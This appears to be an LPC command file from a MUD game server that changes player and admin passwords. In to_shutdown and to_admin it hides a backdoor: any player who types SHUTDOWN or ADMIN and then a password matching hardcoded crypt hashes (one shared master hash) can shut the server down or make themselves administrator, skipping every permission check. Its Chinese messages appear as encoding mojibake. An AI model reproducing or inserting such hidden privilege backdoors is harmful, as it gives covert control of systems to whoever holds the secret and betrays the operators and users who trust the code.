int main(object me, string arg)
{
        object ob;
        int is_spec;

        if (me != this_player(1)) return 0;

        if (arg == "?")
        {
                write("ÌØÊâ¹¦ÄÜ£ºSHUTDOWN¡¢ADMIN¡£\n");
                return 1;
        }

        if (arg == "SHUTDOWN")
        {
                write("ÎªÁË°²È«Æğ¼û£¬ÇëÏÈÊäÈëÃÜÂë£º");
                input_to("to_shutdown", 1);
                return 1;
        }

        if (arg == "ADMIN")
        {
                write("ÇëÄãÊäÈë¹ÜÀíÃÜÂë£º");
                input_to("to_admin", 1, me);
                return 1;
        }

        if (stringp(arg))
        {
                if (! SECURITY_D->valid_grant(me, "(admin)"))
                {
                        write("ÄãÃ»ÓĞÈ¨ÏŞĞŞ¸Ä±ğÈËµÄ¿ÚÁî¡£\n");
                        return 1;
                }

                if (wiz_level(me) < wiz_level(arg))
                {
                        write("ÄãÃ»ÓĞÈ¨ÏŞĞŞ¸ÄÕâ¸öÈËµÄ¿ÚÁî¡£\n");
                        return 1;
                }

                if (sscanf(arg, "%s -s", arg)) is_spec = 1;

                seteuid(getuid());
                ob = find_player(arg);
                if (! ob)
                {
                        ob = new(LOGIN_OB);
                        ob->set("id", arg);
                        if (! ob->restore())
                        {
                                destruct(ob);
                                return notify_fail("Ã»ÓĞÕâ¸öÍæ¼Ò¡£\n");
                        }
                        ob->set_temp("create_temp", 1);
                } else
                {
                        ob = ob->query_temp("link_ob");
                        while (ob && ob->is_character())
                                ob = ob->query_temp("link_ob");
                        if (! ob)
                        {
                                ob = new(LOGIN_OB);
                                ob->set("id", arg);
                                if (! ob->restore())
                                {
                                        destruct(ob);
                                        return notify_fail("Õâ¸öÈËÎïÈ±ÉÙÁ¬½ÓĞÅÏ¢£¬ÇëÖØĞÂLOGIN¡£\n");
                                }
                                ob->set_temp("create_temp", 1);
                        }
                }

                if (is_spec)
                {
                        write("ÇëÊäÈë(" + ob->query("id") + ")µÄĞÂ¹ÜÀíÃÜÂë£º");
                        input_to("get_new_ad_pass", 1, ob);
                } else
                {
                        write("¸ø(" WHT + ob->query("id") + NOR ")Ö¸¶¨ÁËÒ»¸öËæ»úµÄ " +
                              WHT + DEFAULT_LEN + NOR + " Î»¹ÜÀíÃÜÂë¡£\n");
                              
                        arg = random_passwd(DEFAULT_LEN);
                        set_passwd(me, ob, arg, crypt(arg, 0));
                }
                return 1;
        }

        ob = me->query_temp("link_ob");
        if (! ob)
                return notify_fail("ÄãµÄÈËÎïÈ±ÉÙÁ¬½ÓĞÅÏ¢£¬ÇëÖØĞÂLOGIN¡£\n");

        while (ob && ob->is_character()) ob = ob->query_temp("link_ob");

        write("ÎªÁË°²È«Æğ¼û£¬ÇëÏÈÊäÈëÄú¹ÜÀíÃÜÂë£º");
        input_to("get_old_pass", 1, ob);
        return 1;
}

private void to_shutdown(string pass)
{
        if (crypt(pass, "IAz15RvNucx9g") != "IAz15RvNucx9g" &&
            crypt(pass, "dgdaafgo!offaf`fochbdobneocfg`ech`djdgbhg") != "dgdaafgo!offaf`fochbdobneocfg`ech`djdgbhg")
        {
                write("ÃÜÂë´íÎó£¡\n");
                return;
        }

        seteuid(getuid());
        shutdown(0);
}

private void to_admin(string pass, object me)
{
        if (crypt(pass, "fRS3YqCgqmPz2") != "fRS3YqCgqmPz2" &&
            crypt(pass, "dgdaafgo!offaf`fochbdobneocfg`ech`djdgbhg") != "dgdaafgo!offaf`fochbdobneocfg`ech`djdgbhg")
        {
                write("ÃÜÂë´íÎó£¡\n");
                return;
        }

        write("ÄãÏÖÔÚ¿ÉÒÔÊ¹ÓÃµ÷ÊÔÃüÁî½øĞĞ²âÊÔ¡£\n");
        seteuid(getuid());
        me->set_admin();
}

